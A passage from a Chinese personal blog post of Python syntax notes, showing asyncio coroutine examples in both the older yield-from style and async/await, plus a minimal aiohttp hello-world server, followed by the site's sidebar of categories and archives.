	yield from asyncio.sleep(1) #切换到其他协程延时1秒
	print(&#x27;Hello again %s!&#x27;%threading.currentThread())

loop = asyncio.get_event_loop() #消息循环
tasks=[hello(),hello()]
loop.run_until_complete(asyncio.wait(tasks)) #或者loop.run_until_complete(hello())运行一个
loop.close()

输出：
Hello world &lt;_MainThread(MainThread, started 680)&gt;!
Hello world &lt;_MainThread(MainThread, started 680)&gt;!
#暂停1秒后显示下面
Hello again &lt;_MainThread(MainThread, started 680)&gt;!
Hello again &lt;_MainThread(MainThread, started 680)&gt;!
</code></pre>
<ul>
<li><code>async/await</code> Python3.5以后新的语法
<ul>
<li><code>@asyncio.coroutine</code>替换为<code>async</code></li>
<li><code>yield from</code> 替换为<code>await</code></li>
</ul>
<pre><code>import threading
import asyncio

async def hello():
	print(&#x27;Hello world %s!&#x27;%threading.currentThread())
	await asyncio.sleep(1) #切换到其他协程延时1秒
	print(&#x27;Hello again %s!&#x27;%threading.currentThread())

loop = asyncio.get_event_loop() #消息循环
tasks=[hello(),hello()]
loop.run_until_complete(asyncio.wait(tasks))
loop.close()
</code></pre>
</li>
<li><code>aiohttp</code>:基于asyncio实现的HTTP框架
<ul>
<li><code>pip install aiohttp</code></li>
</ul>
<pre><code>import asyncio
from aiohttp import web #pip install aiohttp

async def index(request):
	await asyncio.sleep(0.5)
	return web.Response(body= (&#x27;hello, %s!&#x27; % request.match_info[&#x27;name&#x27;]))

async def init(loop):
	app = web.Application(loop=loop)
	app.router.add_route(&#x27;GET&#x27;,&#x27;&#x2F;{name}&#x27;,index)
	ser =await loop.create_server(app.make_handler(),&#x27;localhost&#x27;,8000)
	print(&#x27;Server started at http:&#x2F;&#x2F;localhost:8000 ...&#x27;)
	return ser
loop = asyncio.get_event_loop()
loop.run_until_complete(init(loop))
loop.run_forever()
</code></pre>
</li>
</ul>

    <div class="muted text-sm">
      <a title="2021-10-10" class="no-underline u-url p-name entry-title" rel="bookmark" href="https://www.obelieve.top/blog/pythonyu-fa/">
        <time class="dt-published published" datetime="2021-10-10">2021.10.10</time>
      </a>
      
      <span>&nbsp;on</span>
      <a title="Notes" class="no-underline p-category" rel="category tag" href="https://www.obelieve.top/categories/notes/">
          Notes
        </a>
      

    </div>
  </article>
  
        
        
    <div class="pagination py">
      <ul class="list-none flex justify-between">
        
          <li class="disabled">
            <a title="First" class="no-underline" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;">&larrb;</a>
          </li>
        
        
          <li class="disabled">
            <a title="Previous"  class="no-underline" href="#">&larr;</a>
          </li>
        
        <li>
          <a title="All Posts" class="no-underline" href="https://www.obelieve.top/archive/">1/1</a>
        </li>
        
          <li class="disabled">
            <a title="Next" class="no-underline" href="#">&rarr;</a>
          </li>
        
        
          <li class="disabled">
            <a title="Last" class="no-underline" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;">&rarrb;</a>
          </li>
        
      </ul>
    </div>
  
      
    </div>
  </div>

          </div>
        </div>
        
        <aside class="sidebar px">
          

          
          <h2 id="zhong-yao-lian-jie">重要链接</h2>
<ul>
<li><a href="https://github.com/obelieve">Github 主页</a></li>
</ul>
<h2 id="guan-yu">关于</h2>
<ul>
<li><a href="/about/">关于我</a></li>
</ul>
<h2 id="dao-hang">导航</h2>
<ul>
<li><a href="https://www.obelieve.top/blog/quotes/">阅读摘要</a></li>
<li><a href="https://www.obelieve.top/blog/askill/">收集小技巧</a></li>
</ul>

          <div class="taxonomy-list-page pt">
            <div class="main-box-block">
              <div class="by">按 <a href="/categories/">分类</a> 查看：</div>
              
              <details class="pb-sm">
                <summary class="text-bigger">Notes&nbsp;(<a href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;categories&#x2F;notes&#x2F;">7</a>)</summary>
                <ul>
                  
                  <li>
    <a href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;celeryku&#x2F;">Celery 分布式任务队列</a>
    <span class="muted text-sm">2025-09-04</span>
  </li>
                  
                  <li>
    <a href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;askill&#x2F;">收集小技巧</a>
    <span class="muted text-sm">2025-09-03</span>
  </li>
                  
                  <li>
    <a href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;quotes&#x2F;">阅读摘要</a>
    <span class="muted text-sm">2025-09-18</span>
  </li>
                  
                  <li>
    <a href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;guan-yu-http&#x2F;">关于HTTP</a>
    <span class="muted text-sm">2025-09-16</span>
  </li>
                  
                  <li>
    <a href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;uijiao-hu-she-ji-yuan-ze&#x2F;">UI交互设计原则</a>
    <span class="muted text-sm">2025-09-07</span>
  </li>
                  
                  <li>
    <a href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;retrofityuan-ma-fen-xi-2-10-0-snapshot&#x2F;">Retrofit源码分析 2.10.0-SNAPSHOT</a>
    <span class="muted text-sm">2025-09-03</span>
  </li>
                  
                  <li>
    <a href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;pythonyu-fa&#x2F;">Python语法</a>
    <span class="muted text-sm">2025-09-03</span>
  </li>
                  
                </ul>
              </details>
              
            </div>
          </div>

          <div class="taxonomy-list-page pt">
            <div class="main-box-block">
              <div class="main-box-block">
                <div class="by">按 <a href="/archive/">归档</a> 查看：</div>
                
                <details class="pb-sm">
                  <summary class="text-bigger">2025</summary>
                  <ul>
                    
                    <li>
    <a href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;celeryku&#x2F;">Celery 分布式任务队列</a>
    <span class="muted text-sm">2025-09-04</span>
  </li>
                    
                    <li>
    <a href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;askill&#x2F;">收集小技巧</a>
    <span class="muted text-sm">2025-09-03</span>
  </li>
                    
                    <li>
    <a href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;quotes&#x2F;">阅读摘要</a>
    <span class="muted text-sm">2025-09-18</span>
  </li>
                    
                    <li>
    <a href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;guan-yu-http&#x2F;">关于HTTP</a>
    <span class="muted text-sm">2025-09-16</span>
  </li>
                    
                  </ul>
                </details>
                
                <details class="pb-sm">
                  <summary class="text-bigger">2024</summary>
                  <ul>
                    
                    <li>
    <a href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;uijiao-hu-she-ji-yuan-ze&#x2F;">UI交互设计原则</a>
    <span class="muted text-sm">2025-09-07</span>
  </li>
                    
                  </ul>
                </details>
                
                <details class="pb-sm">
                  <summary class="text-bigger">2022</summary>
                  <ul>
                    
                    <li>
    <a href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;retrofityuan-ma-fen-xi-2-10-0-snapshot&#x2F;">Retrofit源码分析 2.10.0-SNAPSHOT</a>
    <span class="muted text-sm">2025-09-03</span>
  </li>
                    
                  </ul>
                </details>
                
                <details class="pb-sm">
                  <summary class="text-bigger">2021</summary>
                  <ul>
                    
                    <li>
    <a href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;pythonyu-fa&#x2F;">Python语法</a>
    <span class="muted text-sm">2025-09-03</span>
  </li>
                    
                  </ul>
                </details>
                
              </div>
            </div>
          </div>


          <h2>
            <a class="no-underline" title="标签"
              href="&#x2F;tags/">标签</a>
          </h2>
          <ul class="list-none text-sm">
            
            <li class="inline">
              <a class="no-underline" title="About" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;tags&#x2F;about&#x2F;">About(1)</a>
            </li>
            <li class="inline">
              <a class="no-underline" title="Android" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;tags&#x2F;android&#x2F;">Android(1)</a>
            </li>
            <li class="inline">
              <a class="no-underline" title="Book" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;tags&#x2F;book&#x2F;">Book(1)</a>
            </li>
            <li class="inline">
              <a class="no-underline" title="http" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;tags&#x2F;http&#x2F;">http(1)</a>
            </li>
            <li class="inline">
              <a class="no-underline" title="Okhttp" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;tags&#x2F;okhttp&#x2F;">Okhttp(1)</a>
            </li>
            <li class="inline">
              <a class="no-underline" title="Python" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;tags&#x2F;python&#x2F;">Python(2)</a>
            </li>
            <li class="inline">
              <a class="no-underline" title="Retrofit" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;tags&#x2F;retrofit&#x2F;">Retrofit(1)</a>
            </li>
            <li class="inline">
              <a class="no-underline" title="Shell" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;tags&#x2F;shell&#x2F;">Shell(1)</a>
            </li>
            <li class="inline">
              <a class="no-underline" title="UI" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;tags&#x2F;ui&#x2F;">UI(1)</a>
            </li>
            
          </ul>
        </aside>
        
      </div>
    </div>
    </div>
  <div id="bottom"></div>
  </body>

</html>